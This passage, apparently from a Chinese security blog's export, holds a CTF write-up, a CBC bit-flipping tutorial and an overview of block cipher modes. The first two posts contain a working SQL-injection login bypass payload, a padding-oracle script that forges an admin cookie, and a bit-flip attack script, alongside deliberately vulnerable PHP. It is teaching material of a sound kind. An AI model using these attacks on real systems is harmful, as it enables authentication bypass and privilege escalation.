$password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); return $password == $pass;&#125;function need_login($message = NULL) &#123; echo " &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt; &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;"; if (isset($message)) &#123; echo " &lt;div&gt;" . $message . "&lt;/div&gt;\n"; &#125; echo "&lt;form method=\"POST\" action=''&gt; &lt;div class=\"body\"&gt;&lt;/div&gt; &lt;div class=\"grad\"&gt;&lt;/div&gt; &lt;div class=\"header\"&gt; &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;div class=\"login\"&gt; &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt; &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt; &lt;input type=\"submit\" value=\"Login\"&gt; &lt;/div&gt; &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;";&#125;function show_homepage() &#123; echo "&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;"; global $flag; printf("Hello ~~~ ctfer! "); if ($_SESSION["isadmin"]) echo $flag; echo "&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;";&#125;if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; $username = (string)$_POST['username']; $password = (string)$_POST['password']; $query = "SELECT username, encrypted_pass from users WHERE username='$username'"; $res = $conn-&gt;query($query) or trigger_error($conn-&gt;error . "[$query]"); if ($row = $res-&gt;fetch_assoc()) &#123; $uname = $row['username']; $encrypted_pass = $row["encrypted_pass"]; &#125; if ($row &amp;&amp; login($encrypted_pass, $password)) &#123; echo "you are in!" . "&lt;/br&gt;"; get_identity(); show_homepage(); &#125; else &#123; echo "&lt;script&gt;alert('login failed!');&lt;/script&gt;"; need_login("Login Failed!"); &#125;&#125; else &#123; test_identity(); if (isset($_SESSION["id"])) &#123; show_homepage(); &#125; else &#123; need_login(); &#125;&#125; 大致阅读下代码，可以看出程序逻辑，首先要通过用户认证，也就是说要登录成功，服务端会设置$_SESSION[&quot;id&quot;], 这是后续Padding Oracle攻击的基础；$_SESSION[&quot;id&quot;]是aes-128-cbc加密后的密文，我们能获取初始向量IV,也就是Cookie[&#39;token&#39;], 通过Padding Oracle攻击伪造IV使得解出来的明文为admin即可。 SQL注入+弱类型比较绕过登录查看程序代码，用户认证是通过比较$password == $pass是否相等，$pass 是用户输入的密码，用户可控；而$password 是经AES解密后的值， 而密文$encrypted_pass是从数据库中查询出来的，存在SQL注入，用户可控，然而由于不知道秘钥，也就无法控制解密后的明文。 12345678function login($encrypted_pass, $pass)&#123; $encrypted_pass = base64_decode($encrypted_pass); $iv = substr($encrypted_pass, 0, 16); $cipher = substr($encrypted_pass, 16); $password = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); return $password == $pass;&#125; 查询openssl_decrypt函数，其返回结果解释如下： 1The decrypted string on success or FALSE on failure 解密成功返回解密字符串， 失败则返回false, 如果我们令解密失败返回false, 那么我们只需要$pass=&#39;&#39;或$pass=&#39;0&#39;, 即可利用弱类型比较通过用户认证。要让解密失败，只需令密文长度不满足分组长度要求即可。 payload如下： 12username=-1&apos; union select 1,1 %23password=0 获取Cookie: token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3D ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3D 12345678910Set-Cookie: ID=56mJDsCs%2BQQf%2B44j1et%2BrQ%3D%3DSet-Cookie: token=fxAXU2%2Fzw6PmPMm1TkAgRg%3D%3DContent-Length: 155you are in!&lt;/br&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello ~~~ ctfer! &lt;div&gt;&lt;a href=&quot;logout.php&quot;&gt;Log out&lt;/a&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; Padding Oracle攻击位置cookie认证成功过后，就是利用Padding Oracle攻击获取$_SESSION[&quot;id&quot;]解密后的中间值value, 然后伪造IV, 使得 IV XOR value = &#39;admin&#39; + string(0x11）* 11, 即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-import sysimport stringimport base64import requestsdef str_xor(a, b): return ''.join([chr(ord(i) ^ ord(j)) for i, j in zip(a, b)])base_url = "http://218.2.197.235:23737/index.php"cookies = &#123; 'token': '', 'PHPSESSID': '9uq1qjbeunb085pacngnmhupp3'&#125;tmp_iv = '0' * 16tmp_ivs = list(tmp_iv)# 中间值 [123, 216, 172, 195, 38, 202, 124, 77, 207, 192, 18, 77, 136, 98, 31]value = []# 只能破解出value后15个字符for flag in range(1, 16): for i in range(256): # brute tmp_ivs[15-len(value)] = chr(i) cookies['token'] = base64.b64encode(''.join(tmp_ivs)) resp = requests.get(base_url, cookies=cookies, proxies=&#123;'http': 'http://127.0.0.1:8080'&#125;) if 'ERROR' not in resp.content: value.append(flag ^ i) # 更改初始向量 tmp_iv = '0' * (16-len(value)) + ''.join(chr(value[i] ^ (flag+1)) for i in range(len(value)-1, -1, -1)) tmp_ivs = list(tmp_iv) print flag, i, value break if i == 255: print resp.content print 'error' sys.exit(0)# 逆序value.reverse()fake_id = 'admin' + chr(11) * 11for i in range(256): # 爆破value 第一个字符 value = chr(i) + ''.join(chr(v) for v in value) iv = str_xor(value, fake_id) cookies['token'] = base64.b64encode(iv) resp = requests.get(base_url, cookies=cookies) if 'ERROR' not in resp.content and len(resp.content) &gt; 139: print value print resp.content 后记openssl_encrypt() 函数 options参数为OPENSSL_RAW_DATA, 使用的是PKCS7填充模式]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CBC</tag>
        <tag>NJCTF</tag>
        <tag>Padding Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于CBC模式模式的密文攻击]]></title>
    <url>%2F2017%2F03%2F09%2F%E5%9F%BA%E4%BA%8ECBC%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AF%86%E6%96%87%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[关于CBC模式下的加密和解密，这里不过多阐述，可以参见 分组密码工作模式。 对于CBC解密可以用以下式子表示： Plaintext-1 = Decrypt(Ciphertext-1) XOR IV 只用于第一个组块 Plaintext-N = Decrypt(Ciphertext-N) XOR Ciphertext-N-1 用于第二及剩下的组块 比特翻转攻击从CBC解密表达式可以知道，得到明文的前一步操作是异或操作，改变密文中的一位只会导致其对应的明文块完全改变，下一个明文块中的对应位发生改变，而不会影响到其它明文块的内容。因此，修改IV可以操纵解密出的第一组明文，修改某一个密文分组可以操纵后一个解密出的明文分组，也就是说CBC模式存在两个攻击点： IV向量，影响第一个明文分组 第N个密文分组, 影响第N+1个明文分组 因此对IV和密文分组进行比特翻转攻击，可以伪造某个明文分组对应的比特位。 这里给出如下Demo程序，输入参数a为AES CBC模式加密后的密文(16进制形式)，程序输出解密后的部分明文信息(id, name, email)，要求伪造密文，使得明文id对应的值为0, 程序如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?php// a=89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1$cipherText = $_GET['a']; $key = hex2bin('66616974683434343407070707070707'); // 16 bytes$iv = hex2bin('f4ebb2df9c29efd7625561a15096cd24'); // 16 bytes$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');if (mcrypt_generic_init($td, $key, $iv) != -1)&#123; $p_t = mdecrypt_generic($td, hex2bin($cipherText)); mcrypt_generic_deinit($td); mcrypt_module_close($td); $p_t = trimEnd($p_t); $tmp = explode(':', $p_t); if ($tmp[2] == '0')&#123; print @'id:'.@$tmp[2].'&lt;br/&gt;'; echo 'you are right'; &#125; else&#123; echo @'id:'.@$tmp[2].'&lt;br/&gt;'; echo @'name:'.@$tmp[0].'&lt;br/&gt;'; echo @'email:'.@$tmp[1].'&lt;br/&gt;'; &#125;&#125;function pad2Length($text, $padlen)&#123; $len = strlen($text)%$padlen; $res = $text; $span = $padlen-$len; for($i=0; $i&lt;$span; $i++)&#123; $res .= chr($span); &#125; return $res;&#125;function trimEnd($text)&#123; $len = strlen($text); $c = $text[$len-1]; if(ord($c) &lt;$len)&#123; for($i=$len-ord($c); $i&lt;$len; $i++)&#123; if($text[$i] != $c)&#123; return $text; &#125; &#125; return substr($text, 0, $len-ord($c)); &#125; return $text;&#125; 已知密文长度为48 bytes, 若要改变明文id的值，假设id在第N块明文中第x个字符，表示为N[x](x从1开始)，这里仅简单假设id为单字符，则改变密文N-1[x]或IV[x]， 即可伪造我们需要的id值。显然，我们需要一种方案快速定位到相应的密文位置或IV位置。 已知XOR异或运算: X xor Y = Z, X、Y、Z三个数任意两个运算都可得到第三个。 若不考虑IV, 则明文id肯定可以表示为 id=A XOR B，A是我们可控用来伪造id的密文值，那么改变密文A为:A1 = id, 则得到的明文id为A1 XOR B = A XOR B XOR B = A, 即判断明文id是否修改为A，就能知道是否找到相应的密文位置N-1[x]。假设我们需要伪造的id为fake_id, fake_A= A XOR id XOR fake_id, 得到的明文id就是fake_A XOR B = A XOR id XOR fake_id XOR B = fake_id, 伪造id成功。 程序实现如下： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# -*- coding: utf-8 -*-import reimport requestsurl = 'http://test.loc/cbc.php'clipher_hex = ('89b52bac0331cb0b393c1ac828b4ee0f07861f030a8a3dc4' 'b6e786f473b52182000a0d4ce2145994573a92d257a514d1')plain_id = '1'clipher_indexs = []for i in range(len(clipher_hex)/2): clipher_text = list(clipher_hex.decode('hex')) c = clipher_text[i] clipher_text[i] = plain_id new_clipher_hex = ''.join(clipher_text).encode('hex') resp = requests.get(url, params=&#123;'a': new_clipher_hex&#125;) new_plain_id = resp.content[3] if new_plain_id == c and resp.content[4] == '&lt;': # 有可能出现 c == palin_id 的情况，所以这里可能有多组结果 print i, c.encode('hex'), c clipher_indexs.append(i)fake_id = '0'for i in clipher_indexs: clipher_text = list(clipher_hex.decode('hex')) c = clipher_text[i] fake_c = chr(ord(c) ^ ord(plain_id) ^ ord(fake_id)) clipher_text[i] = fake_c new_clipher_hex = ''.join(clipher_text).encode('hex') resp = requests.get(url, params=&#123;'a': new_clipher_hex&#125;) if resp.content[3] == fake_id and resp.content[4] == '&lt;': print "make a=&#123;&#125;, get id='0'".format(''.join(clipher_text).encode('hex')) break 得到结果: 1make a=89b52bac0331cb0b393c1ac828b4ee0e07861f030a8a3dc4b6e786f473b52182000a0d4ce2145994573a92d257a514d1, get id=&apos;0&apos; 应用条件能获取明文信息，密文或IV可控]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CBC</tag>
        <tag>Padding Oracle</tag>
        <tag>比特翻转</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分组密码工作模式]]></title>
    <url>%2F2017%2F03%2F06%2F%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[在密码学中，分组加密(Block cipher)，又称分块加密或块密码，是一种对称密钥算法。 它将明文分成多个等长的模块(block)，使用确定的算法和对称密钥对每组分别加密解密。 常见的分组加密算法有: DES、3DES、AES、IDEA。 工作模式参考: 维基百科 分组密码算法只能加密固定长度的分组，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到匹配密码块大小的长度。对于变长数据需要对分组密码算法进行迭代，以便将明文全部加密。而迭代的方法就称为分组密码的模式（mode），主要有以下模式： ECB模式：Electronic CodeBook mode（电子密码模式） CBC模式：Cipher Block Chaining mode（密码分组链接模式） CFB模式：Cipher FeedBack mode（密文反馈模式） OFB模式：Output FeedBack mode（输出反馈模式） CTR模式：CounTeR mode（计数器模式） 常见分组密码算法分组长度和秘钥长度如下表: 密码算法 分组长度 秘钥长度 DES 64 bit/8 byte 64(56+8) bit/8 byte 3DES 64 bit/8 byte 64/64*2/64*3 bit AES 128 bit/16 byte 128/192/256 bit 一般采用的填充方式有如下几种: ANSIX923 ANSIX923 填充字符串由一个字节序列组成，此字节序列的最后一个字节填充字节序列的长度，其余字节均填充数字零。假定块长度为8，数据长度为 9，数据： FF FF FF FF FF FF FF FF FF，填充： FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07 ISO10126 ISO10126 填充字符串由一个字节序列组成，此字节序列的最后一个字节填充字节序列的长度，其余字节填充随机数据。假定块长度为 8，数据长度为 9，数据： FF FF FF FF FF FF FF FF FF，填充： FF FF FF FF FF FF FF FF FF 7D 2A 75 EF F8 EF 07 PKCS7 PKCS7 填充字符串由一个字节序列组成，每个字节填充该字节序列的长度。假定块长度为 8，数据长度为 9，数据： FF FF FF FF FF FF FF FF FF，填充： FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07，如果恰好8个字节时还要补8个字节的0x08，可以让解密的数据很确定无误的移除多余的字节。 PKCS5Padding 和 PKCS7Padding 在这方面是类似的。不同点在于，选择算法的时候如果选用 PKCS5Padding 填充模式，就是明确指定块大小是 8 个字节。选用 PKCS7Padding 则是没有明确指定块大小。如果选择算法的时候选用 PKCS7Padding 填充模式，同时设置块大小为 8 字节，和选用 PKCS5Padding 填充模式，没有设置块大小（实际已经设置了 8 字节），这两种情况下，两种填充模式没有区别。另外有个值得注意的是，AES 中块大小是固定 16 字节。 Zeros 填充字符串由设置为零的字节组成 ECBECB 将需要加密的明文按照块密码的块大小分为若干块，并对每个块独立进行加密，加密和解密过程如下: ECB模式中，明文和密文是一一对应的，相同的明文分组加密将会得到相应的密文分组。因此，它不能很好的隐藏数据模式。同时还存在安全风险，容易受到重放攻击, 改变密文分组的顺序，可以改变解密后明文分组的顺序。 优点 缺点 简单 不能隐藏明文的模式 利于并行计算 可能对明文进行主动攻击 不会传递误差 CBCCBC模式加密，先将明文分组与前一个密文分组(或为初始化向量IV)进行XOR运算，然后再进行加密；解密，密文分组先进行解密，然后再进行xor运算得到明文分组。 CBC加密，每个密文块都依赖于它前面所有的明文块，这有效解决了ECB模式中泄露明文模式的问题，但同时明文块的误差会传播到后面所有的密文块。 优点 缺点 安全性好于ECB 误差传递 隐藏了明文模式 不利于并行计算 需要初始化向量IV 翻转攻击CBC解密可以用如下式子表示： Plaintext-1 = Decrypt(Ciphertext-1) XOR IV 只用于第一个组块 Plaintext-N = Decrypt(Ciphertext-N) XOR Ciphertext-N-1 用于第二及剩下的组块 改变IV的值，只会影响解密出的第一组明文，而改变密文中的一位只会导致其对应的明文块完全改变，下一个明文块中的对应位发生改变，而不会影响到其它明文块的内容。因此，修改IV可以操纵解密出的第一组明文，修改某一个密文分组可以操纵后一个解密出的明文分组，也就是说CBC模式存在两个攻击点： IV向量，影响第一个明文分组 第N个密文分组, 影响第N+1个明文分组 攻击场景常见的攻击场景有权限提升和验证绕过 CFBCFB模式可以看做是一种使用分组密码来实现流密码的方式, CFB模式中由密码算法所生成的比特序列称为密钥流（key stream）。在CFB模式中，密码算法就相当于用来生成密钥流的伪随机数生成器，而初始化向量就相当于伪随机数生成器的“种子”， 它的明文数据可以被逐比特加密。 优点 缺点 分组密码转化为流模式 误差传递 隐藏了明文模式 不利于并行计算 可以及时加密传送小于分组的数据 需要初始化向量IV 重放攻击 OFBOFB模式中，密码算法的输出会反馈到密码算法的输入中。OFB模式不是通过密码算法对明文直接进行加密的，而是通过将“明文分组”和“密码算法的输出”进行XOR来产生“密文分组”的 CTRCTR模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。CTR模式中，每个分组对应一个逐次累加的计数器，并通过对计数器进行加密来生成密钥流。也就是说最终的密文分组是通过将计数器加密得到的比特序列，与明文分组进行XOR而得到的 特点 加密和解密使用了完全相同的结构，程序实现上比较容易 可以以任意顺序对分组进行加密和解密 不会放大错误，假设CTR模式的密文分组中有一个比特被翻转了，则解密后明文分组中仅有与之对应的比特会被翻转，这一错误不会放大]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CBC</tag>
        <tag>ECB</tag>
        <tag>分组加密</tag>
      </tags>
  </entry>
</search>
